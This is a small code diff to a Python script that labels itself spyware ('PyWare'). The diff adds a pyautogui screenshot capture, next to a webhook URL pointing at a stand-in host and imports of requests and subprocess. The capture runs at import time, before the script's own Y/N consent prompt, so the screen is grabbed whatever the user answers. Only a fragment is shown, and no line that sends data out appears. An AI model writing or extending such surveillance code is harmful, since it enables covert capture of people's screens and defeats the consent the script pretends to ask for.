@@ -2,7 +2,9 @@ import time
 import os
 import requests
 import subprocess
+import pyautogui
 
+screenshot = pyautogui.screenshot()
 Webhook_url = "https://example.com"
 print("--PyWare--")
 Run = input("This is SPYWARE are you sure you want to run? Y/N | ")
@@ -30,3 +32,4 @@ else:
     print("Closing program please wait...")
     time.sleep(3)
     print("")
+
